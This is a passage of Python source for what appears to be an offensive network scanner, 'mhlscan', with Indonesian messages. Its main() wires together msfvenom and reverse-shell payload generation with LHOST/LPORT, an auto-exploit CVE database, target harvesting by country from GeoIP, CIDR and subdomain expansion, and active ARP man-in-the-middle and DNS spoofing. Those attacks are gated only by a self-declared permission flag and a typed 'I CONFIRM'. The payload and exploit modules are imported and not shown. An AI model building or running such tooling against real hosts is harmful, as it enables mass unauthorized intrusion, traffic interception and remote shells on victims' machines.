    # --- MITM / DNS Poison (active GATE) ---
    p.add_argument("--mitm-detect", action="store_true",
                   help="Passive MITM detection (ARP/DNS)")
    p.add_argument("--mitm-active", action="store_true",
                   help="Active ARP MITM (GATE: --i-have-permission)")
    p.add_argument("--dns-spoof", action="store_true",
                   help="Active DNS spoof (GATE: --i-have-permission)")
    p.add_argument("--mitm-target", metavar="IP",
                   help="Target IP for MITM (victim)")
    p.add_argument("--mitm-gateway", metavar="IP",
                   help="Gateway IP for MITM")
    p.add_argument("--spoof-ip", default="127.0.0.1",
                   help="Fake IP for DNS spoof (default: 127.0.0.1)")
    p.add_argument("--spoof-domain", default=None,
                   help="Domain to spoof (default: all)")
    p.add_argument("--i-have-permission", action="store_true",
                   help="Konfirmasi izin untuk aktif MITM/DNS")
    return p


def main(argv=None):
    global gl_interrupted, _nuclei_run_flag, _plugins_enabled

    # === PRE-PARSE: --list-cves (bypass required args) ===
    _args = argv if argv is not None else sys.argv[1:]
    if "--list-payloads" in _args:
        try:
            import _payload_gen
            banner()
            _st = _payload_gen.status()
            print(f"{CYAN}Payload Generator:{ENDC}")
            print(f"  Payloads: {_st['payloads']}")
            for _p in _st['catalog']['payloads']:
                _info = _payload_gen.PAYLOAD_CATALOG.get(_p, {})
                print(f"    - {_p:<30} {_info.get('note', '')[:60]}")
            print(f"  Encoders: {', '.join(_st['catalog']['encoders'])}")
            print(f"  Formats : {', '.join(_st['catalog']['formats'])}")
            print(f"  msfvenom: {'OK' if _st['msfvenom'] else 'not installed'}")
        except Exception as _e:
            print(f"[!] {_e}")
        return 0
    if "--list-encoders" in _args:
        try:
            import _payload_gen
            banner()
            print(f"{CYAN}Encoders:{ENDC}")
            for _e in _payload_gen.list_encoders():
                print(f"  - {_e}")
            print(f"{CYAN}Formats:{ENDC}")
            for _f in _payload_gen.list_formats():
                print(f"  - {_f}")
        except Exception as _e:
            print(f"[!] {_e}")
        return 0
    if "--gen-payload" in _args:
        try:
            import _payload_gen
            banner()
            _idx = _args.index("--gen-payload")
            _name = _args[_idx + 1] if _idx + 1 < len(_args) else None
            if not _name:
                print("[!] butuh payload name")
                return 1
            _kwargs = {}
            for _flag, _key in [("--lhost", "lhost"), ("--lport", "lport"),
                                 ("--encode", "encoder"), ("--format", "fmt")]:
                if _flag in _args:
                    _i = _args.index(_flag)
                    if _i + 1 < len(_args):
                        _v = _args[_i + 1]
                        if _key in ("lport",):
                            try: _v = int(_v)
                            except: pass
                        _kwargs[_key] = _v
            _res = _payload_gen.generate(_name, **_kwargs)
            if not _res.get("success"):
                print(f"[!] {_res.get('error')}")
                return 1
            print(f"=== {_name} ===")
            print(f"Size: {_res.get('raw_size')} bytes")
            if _res.get('encoded'):
                print(f"Encoder: {_res['encoded']}")
            print(f"Format: {_res.get('format')}")
            print()
            print(_res['payload'])
            return 0
        except Exception as _e:
            print(f"[!] {_e}")
            return 1
    if "--msfvenom" in _args:
        try:
            import _payload_gen
            banner()
            _idx = _args.index("--msfvenom")
            _payload = _args[_idx + 1] if _idx + 1 < len(_args) else None
            if not _payload:
                print("[!] butuh payload name")
                return 1
            _kwargs = {"payload": _payload}
            for _flag, _key in [("--lhost", "lhost"), ("--lport", "lport"),
                                 ("--msf-format", "format_type"),
                                 ("--encode", "encoder")]:
                if _flag in _args:
                    _i = _args.index(_flag)
                    if _i + 1 < len(_args):
                        _v = _args[_i + 1]
                        if _key == "lport":
                            try: _v = int(_v)
                            except: pass
                        _kwargs[_key] = _v
            _res = _payload_gen.msfvenom_generate(**_kwargs)
            if not _res.get('success'):
                print(f"[!] {_res.get('error')}")
                return 1
            print(f"=== msfvenom {_payload} ===")
            print(f"Command: {_res.get('command')}")
            print(f"Size: {_res.get('size')} bytes")
            print()
            print(_res.get('output', ''))
            return 0
        except Exception as _e:
            print(f"[!] {_e}")
            return 1
    if "--list-exploits" in _args:
        try:
            import _exploits_db
            banner()
            _st = _exploits_db.status()
            print(f"{CYAN}Exploit DB ({_st['total_cves']} CVE, "
                  f"{_st['kev_count']} KEV, {_st['exploitable_count']} auto-exploit):{ENDC}")
            for _cid in sorted(_exploits_db.list_cves()):
                _info = _exploits_db.get_cve(_cid)
                _kev = "KEV" if _info.get("kev") else "   "
                _auto = "AUTO" if _info.get("exploit") else "MANU"
                print(f"  {_info['severity']:<8} {_cid:<18} {_kev} {_auto} {_info['name'][:50]}")
        except Exception as _e:
            print(f"[!] {_e}")
        return 0
    if "--list-cves" in _args:
        try:
            import cve_modules
            banner()
            print(f"{CYAN}CVE Modules ({len(cve_modules.CVE_MODULES)}):{ENDC}")
            cve_modules.list_modules()
        except ImportError as e:
            print(f"[!] cve_modules not found: {e}")
        return 0
    global GL_REV_SHELL, GL_LHOST, GL_LPORT, GL_OAST_CLIENT, GL_CRAWL_ENABLED
    global GL_CRAWL_MAX_PAGES, GL_CRAWL_MAX_DEPTH, GL_AUTH_CONFIG
    args = build_parser().parse_args(argv)
    banner()

    _nuclei_run_flag = True
    _plugins_enabled = getattr(args, 'plugins', False)
    GL_REV_SHELL = getattr(args, 'rev_shell', False)
    GL_LHOST = getattr(args, 'lhost', None)
    GL_LPORT = getattr(args, 'lport', 4444)

    _HTTPFlags.enabled = not getattr(args, 'skip_http_methods', False)
    _HTTPFlags.put = getattr(args, 'http_put', False)
    GL_AGGRESSIVE = getattr(args, 'aggressive', False)
    GL_PARAM_DISCOVERY = getattr(args, 'param_discovery', False)
    GL_JWT_ANALYSIS = getattr(args, 'jwt_analysis', False)
    GL_SMUGGLE = getattr(args, 'smuggle', False)
    GL_XSS_ENABLED = getattr(args, 'xss', False)
    GL_AUTO_EXPLOIT = getattr(args, 'auto_exploit', False)
    GL_POST_READ = getattr(args, 'post_read', False)
    GL_POST_WRITE = getattr(args, 'post_write', False)
    GL_XSS_STORED = getattr(args, 'xss_stored', False)
    GL_CRAWL_MODE = getattr(args, 'crawl_mode', 'bfs')
    GL_CRAWL_RATE = getattr(args, 'crawl_rate', 1.0)
    GL_MITM_DETECT = getattr(args, 'mitm_detect', False)
    if GL_AGGRESSIVE:
        print(f"{YELLOW}[!] Aggressive mode ON (race/UAF modules aktif){ENDC}")

    # OAST init
    if getattr(args, 'oast', False):
        try:
            if _oast.is_available():
                GL_OAST_CLIENT = _oast.get_client(getattr(args, 'oast_server', 'oast.live'))
                _rce.set_oast_client(GL_OAST_CLIENT)
                if GL_OAST_CLIENT and getattr(GL_OAST_CLIENT, '_registered', False):
                    print(f"{GREEN}[+] OAST registered: {GL_OAST_CLIENT.correlation_id}{ENDC}")
                else:
                    print(f"{YELLOW}[!] OAST register failed{ENDC}")
                    GL_OAST_CLIENT = None
            else:
                print(f"{YELLOW}[!] cryptography not installed{ENDC}")
        except Exception as e:
            print(f"{YELLOW}[!] OAST error: {e}{ENDC}")

    # Auth init
    if getattr(args, 'auth_config', None):
        try:
            GL_AUTH_CONFIG = _auth.load_auth_config(args.auth_config)
            if GL_AUTH_CONFIG:
                print(f"{GREEN}[+] Auth loaded: {args.auth_config}{ENDC}")
        except Exception as e:
            print(f"{YELLOW}[!] Auth error: {e}{ENDC}")

    GL_CRAWL_ENABLED = getattr(args, 'crawl', False)
    GL_CRAWL_MAX_PAGES = getattr(args, 'crawl_max_pages', 50)
    GL_CRAWL_MAX_DEPTH = getattr(args, 'crawl_max_depth', 3)

    # CVE modules: disable (runtime)
    if getattr(args, 'disable_cve', None):
        import cve_modules
        for cve in args.disable_cve:
            if cve_modules.disable(cve):
                print(f"{GREEN}[+] Disabled: {cve}{ENDC}")
            else:
                print(f"{YELLOW}[!] Not found: {cve}{ENDC}")

    if args.update: run_update("default"); return 0
    if args.update_all: run_update("all"); return 0
    if getattr(args, 'update_nuclei', False): run_update("nuclei"); return 0
    if getattr(args, 'update_cve_db', False): run_update("cve-db"); return 0
    if args.update_stack: run_update("stack", stack=args.update_stack); return 0
    if args.consume and not args.sodok_file:
        print(f"{RED}[!] --consume butuh --sodok-file{ENDC}"); return 1

    # ============ STEP 1: COLLECT RAW TARGETS ============
    if getattr(args, 'ip_country', None):
        print(f"\n{BLUE}[*] GeoIP: negara {args.ip_country.upper()}{ENDC}")
        ips = _geoip.get_ips_by_country(args.ip_country,
                                         limit=getattr(args, 'geo_limit', 50))
        if not ips:
            print(f"{RED}[!] Gagal ambil IP untuk {args.ip_country}{ENDC}"); return 1
        out_file = "listIPtarget.txt"
        with open(out_file, "w") as f:
            for ip in ips:
                f.write(f"http://{ip}\n")
        print(f"  {GREEN}[+] {len(ips)} IP disimpan ke {out_file}{ENDC}")
        targets_raw = [f"http://{ip}" for ip in ips]
    else:
        targets_raw = (parse_targets(args.sodok) if args.sodok
                       else parse_target_file(args.sodok_file))

    if not targets_raw:
        print(f"{RED}[!] Tidak ada target valid{ENDC}"); return 1

    # ============ STEP 2: EXPAND CIDR (SEBELUM KLASIFIKASI) ============
    cidr_blocks = [t for t in targets_raw if _is_cidr(t)]
    if cidr_blocks:
        print(f"\n{BLUE}[*] Expanding {len(cidr_blocks)} CIDR block(s){ENDC}")
        expanded_cidr = []
        for cidr in cidr_blocks:
            _disc_mode = getattr(args, 'discovery', 'all')
            if _disc_mode and _disc_mode != "tcp":
                _methods = (["arp", "icmp", "tcp"] if _disc_mode == "all"
                            else [_disc_mode])
                _disc = _discovery.discover_subnet(
                    cidr,
                    methods=_methods,
                    workers=getattr(args, 'cidr_threads', 100),
                    timeout=1.5,
                    max_hosts=getattr(args, 'cidr_max', 256),
                )
                if _disc.get("error"):
                    print(f"  {RED}[!] Discovery error: {_disc['error']}{ENDC}")
                    new_t = expand_cidr(
                        cidr,
                        max_hosts=getattr(args, 'cidr_max', 256),
                        workers=getattr(args, 'cidr_threads', 100),
                        timeout=1.5,
                        live_only=not getattr(args, 'cidr_all', False))
                    expanded_cidr.extend(new_t)
                else:
                    for _h in _disc.get("live", []):
                        _ip = _h["ip"]
                        _proto = "http"
                        _ports = [_h.get("open_tcp_port")] if _h.get("open_tcp_port") else []
                        if _ports:
                            new_t = [f"{_proto}://{_ip}:{p}" for p in _ports if p]
                        else:
                            new_t = [f"http://{_ip}"]
                        expanded_cidr.extend(new_t)
                    print(f"  {GREEN}[+] Discovery: {len(_disc.get('live', []))} live "
                          f"dari {_disc.get('total', 0)} host{ENDC}")

                    # Neighbor board
                    if getattr(args, 'neighbor_board', False):
                        try:
                            _board = _discovery.build_neighbor_board(cidr, _disc)
                            print(_discovery.format_neighbor_board(_board))
                        except Exception as _e:
                            print(f"  {YELLOW}[!] neighbor board: {_e}{ENDC}")
            else:
                new_t = expand_cidr(
                    cidr,
                    max_hosts=getattr(args, 'cidr_max', 256),
                    workers=getattr(args, 'cidr_threads', 100),
                    timeout=1.5,
                    live_only=not getattr(args, 'cidr_all', False))
                expanded_cidr.extend(new_t)
        targets_raw = [t for t in targets_raw if not _is_cidr(t)] + expanded_cidr
        if not targets_raw:
            print(f"{RED}[!] Tidak ada host hidup di CIDR{ENDC}")
            print(f"{YELLOW}    Gunakan --cidr-all untuk scan semua IP{ENDC}")
            return 1
        print(f"  {GREEN}[+] Setelah CIDR expand: {len(targets_raw)} target{ENDC}")

    # ============ STEP 3: KLASIFIKASI ============
    print(f"\n{BLUE}[*] Klasifikasi Target{ENDC}")
    classified = []
    for t in targets_raw:
        c = _subdomain.classify_target(t)
        c["url"] = t
        classified.append(c)
        icon = {"ip": "[IP]", "root_domain": "[DOMAIN]",
                "subdomain": "[SUBDOMAIN]"}.get(c["type"], "[?]")
        print(f"  {icon:12} {t}")

    root_domains = [c for c in classified if c["type"] == "root_domain"]
    subdomain_inputs = [c for c in classified if c["type"] == "subdomain"]
    ip_inputs = [c for c in classified if c["type"] == "ip"]
    print(f"\n  Ringkasan: {len(root_domains)} domain, "
          f"{len(subdomain_inputs)} subdomain, {len(ip_inputs)} IP")

    # ============ STEP 4: SUBDOMAIN ENUM (HANYA ROOT DOMAIN) ============
    auto_sub = (not getattr(args, 'no_subdomain', False)) and bool(root_domains)
    only_sub = getattr(args, 'subdomain_only', False)
    if only_sub and not root_domains:
        print(f"{YELLOW}[!] --subdomain-only diabaikan: tidak ada root domain{ENDC}")
        only_sub = False

    targets = [c["url"] for c in classified]
    if auto_sub or only_sub:
        aggressive = getattr(args, 'subdomain_aggressive', False)
        limit = getattr(args, 'subdomain_limit', 50)
        expanded_targets = []
        for c in root_domains:
            base = c["base"]
            if not base: continue
            print(f"\n{BOLD}{CYAN}[subdomain] {base}{ENDC}")
            enum = _subdomain.enumerate_subdomains(base, aggressive=aggressive)
            print(f"  {GREEN}[+] {enum['stats']['resolved']} resolved "
                  f"dari {enum['stats']['total']}{ENDC}")

            if enum["groups"]:
                print(f"\n  {CYAN}Group by IP (VHOST):{ENDC}")
                multi = {ip: hs for ip, hs in enum["groups"].items() if len(hs) > 1}
                single = {ip: hs for ip, hs in enum["groups"].items() if len(hs) == 1}
                for ip, hs in sorted(multi.items()):
                    print(f"    {YELLOW}{ip}{ENDC} (VHOST, {len(hs)}):")
                    for h in sorted(hs)[:5]:
                        print(f"        - {h}")
                    if len(hs) > 5:
                        print(f"        ... +{len(hs)-5}")
                for ip, hs in sorted(single.items())[:5]:
                    print(f"    {ip} (dedicated): {hs[0]}")

            out_file = Path(f"subdomain_{base.replace('.', '_')}.json")
            out_file.write_text(json.dumps(enum, indent=2))
            print(f"\n  {GREEN}[+] Saved: {out_file}{ENDC}")

            if not only_sub:
                urls = _subdomain.prepare_scan_targets(enum, max_targets=limit)
                print(f"  {GREEN}[+] {len(urls)} subdomain aktif masuk queue{ENDC}")
                expanded_targets.extend(urls)

        if only_sub:
            return 0

        if expanded_targets:
            targets = list(dict.fromkeys(targets + expanded_targets))
            print(f"\n{BLUE}[*] Total setelah subdomain: {len(targets)}{ENDC}")

    if subdomain_inputs:
        print(f"    {CYAN}[INFO]{ENDC} {len(subdomain_inputs)} subdomain input di-scan langsung")
    if ip_inputs:
        print(f"    {CYAN}[INFO]{ENDC} {len(ip_inputs)} IP input di-scan langsung")

    # ============ STEP 5: EXPAND WEB PORTS (PARALLEL) ============
    if not getattr(args, 'no_port_expand', False):
        ip_count = sum(1 for t in targets if _is_ip_url(t))
        if ip_count > 0:
            print(f"\n{BLUE}[*] Expanding {ip_count} IP ke SEMUA open web ports...{ENDC}")
            original = len(targets)
            targets = expand_web_ports(targets, timeout=args.timeout, workers=25)
            if len(targets) > original:
                print(f"  {GREEN}[+] Expanded: {original} → {len(targets)}{ENDC}")
            else:
                print(f"  {YELLOW}[=] Tidak ada port tambahan{ENDC}")

    if not targets:
        print(f"{RED}[!] Tidak ada target yang bisa di-scan{ENDC}")
        return 1

    def _sigint(s, f):
        global gl_interrupted
        gl_interrupted = True
        print(f"\n{YELLOW}[!] Dihentikan{ENDC}"); sys.exit(1)
    # === MITM / DNS POISON GATE ===
    _mitm_active = getattr(args, 'mitm_active', False)
    _dns_active = getattr(args, 'dns_spoof', False)
    _mitm_detect = getattr(args, 'mitm_detect', False)
    _has_perm = getattr(args, 'i_have_permission', False)
    _target_ip = getattr(args, 'mitm_target', None)
    _gateway_ip = getattr(args, 'mitm_gateway', None)
    _spoof_ip = getattr(args, 'spoof_ip', '127.0.0.1')
    _spoof_domain = getattr(args, 'spoof_domain', None)

    if _mitm_detect:
        print(f"\n{YELLOW}[*] MITM passive detection (30s)...{ENDC}")
        try:
            if _mitm.status().get("scapy") and _mitm.status().get("root"):
                _r_arp = _mitm.detect_arp_poison(duration=30)
                print(f"  ARP suspicious: {len(_r_arp.get('suspicious', []))}")
                _r_ssl = _mitm.detect_sslstrip(duration=30)
                print(f"  SSL strip suspicious: {_r_ssl.get('count', 0)}")
                if _dnspoison.status().get("scapy"):
                    _r_dns = _dnspoison.detect_dns_anomaly(duration=30)
                    print(f"  DNS anomalies: {len(_r_dns.get('suspicious', []))}")
        except Exception as _e:
            print(f"  {RED}[!] MITM detect error: {_e}{ENDC}")

    if _mitm_active or _dns_active:
        print(f"\n{RED}{'='*60}{ENDC}")
        print(f"{RED}{BOLD}  ACTIVE NETWORK ATTACK GATE{ENDC}")
        print(f"{RED}{'='*60}{ENDC}")
        if not _has_perm:
            print(f"{RED}[!] Butuh --i-have-permission untuk aktif MITM/DNS.{ENDC}")
            sys.exit(1)
        if not _mitm.status().get("linux"):
            print(f"{RED}[!] MITM aktif hanya di Linux.{ENDC}")
            sys.exit(1)
        if not _mitm.status().get("root"):
            print(f"{RED}[!] MITM aktif butuh root.{ENDC}")
            sys.exit(1)
        if not _mitm.status().get("scapy"):
            print(f"{RED}[!] Butuh scapy: pip install scapy{ENDC}")
            sys.exit(1)
        if _mitm_active and (not _target_ip or not _gateway_ip):
            print(f"{RED}[!] --mitm-active butuh --mitm-target dan --mitm-gateway{ENDC}")
            sys.exit(1)
        print(f"{YELLOW}  Target: {_target_ip or 'N/A'}{ENDC}")
        print(f"{YELLOW}  Gateway: {_gateway_ip or 'N/A'}{ENDC}")
        print(f"{YELLOW}  Spoof IP: {_spoof_ip}{ENDC}")
        print(f"{YELLOW}  Spoof domain: {_spoof_domain or '*ALL*'}{ENDC}")
        try:
            _confirm = input(f"{RED}  Ketik 'I CONFIRM' untuk lanjut: {ENDC}").strip()
        except (EOFError, KeyboardInterrupt):
            _confirm = ""
        if _confirm != "I CONFIRM":
            print(f"{YELLOW}[!] Dibatalkan.{ENDC}")
            sys.exit(0)

        if _mitm_active:
            try:
                _res = _mitm.arp_mitm(_target_ip, _gateway_ip,
                                     interface="eth0", duration=60)
                print(f"  [*] ARP MITM result: {_res}")
            except Exception as _e:
                print(f"  {RED}[!] MITM error: {_e}{ENDC}")

        if _dns_active:
            try:
                _res = _dnspoison.dns_spoof(
                    fake_ip=_spoof_ip,
                    target_domain=_spoof_domain,
                    target_ip=_target_ip,
                    duration=60)
                print(f"  [*] DNS spoof captured: {_res.get('count', 0)}")
            except Exception as _e:
                print(f"  {RED}[!] DNS spoof error: {_e}{ENDC}")

    signal.signal(signal.SIGINT, _sigint)

    run_scan(targets,
             timeout=args.timeout, proxy=args.proxy,
             proxy_list=args.proxy_list, stealth=not args.no_stealth,
             war_url=args.war_url, report_path=args.report,
             consume=args.consume, sodok_file=args.sodok_file,
             interactive_allowed=not args.no_interactive,
             severity=args.severity, skip_generic=args.skip_generic,
             jboss_only=args.jboss_only, deep_services=args.deep_services,
             workers=args.workers)
    return 0


if __name__ == "__main__":
    # Jika dijalankan tanpa argumen (python3 mhlscan.py), buka Menu Interaktif
    if len(sys.argv) == 1:
        try:
            import _menu
            sys.exit(_menu.main())
        except ImportError as e:
            print(f"[!] Gagal memuat menu: {e}")
            sys.exit(main())
    # Jika ada argumen (misal: --sodok), jalankan mode CLI biasa
    sys.exit(main())
